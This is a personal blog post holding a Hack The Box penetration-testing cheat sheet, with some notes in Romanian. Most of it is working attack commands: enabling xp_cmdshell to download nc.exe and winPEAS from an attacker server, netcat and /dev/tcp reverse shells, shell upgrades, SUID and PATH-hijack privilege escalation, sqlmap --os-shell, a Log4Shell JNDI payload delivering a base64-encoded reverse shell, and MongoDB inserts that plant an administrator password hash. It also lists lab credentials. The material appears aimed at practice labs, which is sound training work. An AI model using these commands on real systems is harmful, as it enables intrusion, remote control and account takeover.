---
layout: post
title:  Cheat sheet htb
image: /assets/img/HTB.png
date:   2022-08-29 21:28:48
tags:
- cheat sheets
description: Hack the box cheat sheet
categories:
- cheat sheets
---

Hack the box cheat sheet

Responder
reponder -I interface
request file as //ip from responder/somefile

john --wordlist=/usr/share/wordlists/rockyou.txt hashfile
evil-wrm connect to windows httpapi

smbmap -H 10.129.74.255
smbclient -L 10.129.74.255 -list shares
if no $ sign => non admin share

smbclient //10.129.74.255\\backups 

impacket-mssqlclient -u ARCHETYPE/sql_svc -p M3g4c0rp123 10.129.230.252
enable_xp_cmdshell

Open a server python
python3
python -m http.server 8000
python2
python -m SimpleHTTPServer 8069 
xp_cmdshell "powershell.exe /c Invoke-WebRequest -Uri "http://10.10.15.126:8069/winPEASx64.exe" -OutFile "C:\Windows\Temp\sc.exe"  "


powershell.exe /c Invoke-WebRequest -Uri "http://10.10.15.126:8069/winPEASx64.exe" -OutFile "C:/Windows/temp/"

powershell.exe /c Invoke-WebRequest -Uri "http://10.10.15.126:8069/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"

nc –lp 8888
nc.exe 10.10.15.126 8888 –e cmd.exe

if the netcat won't execute
1.xp_cmdshell "ECHO C:\\Windows\\Temp\\nc.exe -e cmd.exe 10.10.15.126 8888 > C:\\Windows\\Temp\\nc.bat"
2.xp_cmdshell "C:\\Windows\\Temp\\nc.bat"

xp_cmdshell "powershell.exe /c Invoke-WebRequest -Uri "http://10.10.15.126:8069/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"

screen file -> to record input/output to file

if you can port 587 or smth
evil-winrm -u administrator -p 'MEGACORP_4dm1n!!' -i 10.129.244.171

type is like cat for linux

foxyproxy-> enable/disable proxies on the go
https://www.revshells.com

10.10.15.126 
/bin/bash pe kali-ul tau inainte
python3 -c 'import pty;pty.spawn("/bin/bash");'
stty raw -echo
 export TERM=xterm
ctrl+j cand esti in stty raw -echo
fish terminal pentru asta ca altfel face urat 888

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>


#######################################################
# Spawning a TTY Shell                                #
#######################################################

python -c 'import pty; pty.spawn("/bin/sh")'

echo os.system('/bin/bash')

/bin/sh -i

perl —e 'exec "/bin/sh";'

perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')

# (From within IRB)
exec "/bin/sh"

# (From within vi)
:!bash

# (From within vi)
:set shell=/bin/bash:shell

# (From within nmap)
!sh

stty -rows 46 -columns 289


grep -R -i "pass"

find / -group bugtracker 2>/dev/null
66|find / -name root.txt  2>/dev/null


find / -perm -4000 -type f

daca e un exe care executa o comanda schimba path variable in export PATH=/tmp:$PATH si dupa pune un shell acolo

chmod +x ala si gata

zip2john -converts zip hash to john hash

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

hashid - identify hash

sudo -l -> what commands as sudo
sudo comanda aia si esti root

salveaza requestul intr-un fisier din burp si da sqlmap --os-shell -r new.request

dnslog gives you a dns address for callback
dnslog.cn, https://dig.pm/, http://dnslog.xyz/

log4j testing
curl -i -s -k -X POST -H $'Host: 10.129.179.73:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://ildckx.dnslog.cn:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.179.73:8443/api/login'
echo 'bash -c bash -i >&/dev/tcp/10.129.179.126/8888 0>&1' | base64
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMTI2Lzg4ODggMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.126"


curl -i -s -k -X POST -H $'Host: 10.129.179.73:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.15.126:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.179.73:8443/api/login'


tcpdump -i tun0 port xxxx

db.admin.update({ name: "cat@catcat" }, { $set: { "x_shadow": "$6$wNBKFIoF/qoFc0/Y$oIKozG1ma1uUX2okypTpNPgB/ijLdRg07Nxs18HAy8FljX5TpIunCnqYJfdcuF3k34ahSfHfk8r5JMOwaAf0m/" } });


db.admin.insert({ "email" : "cat@catson.cat", "last_site_name" : "default", "name" : "caty", "time_created" : NumberLong(100019800), "x_shadow" : "$6$wNBKFIoF/qoFc0/Y$oIKozG1ma1uUX2okypTpNPgB/ijLdRg07Nxs18HAy8FljX5TpIunCnqYJfdcuF3k34ahSfHfk8r5JMOwaAf0m/" })
create a hash: mkpasswd -m sha-512 wpass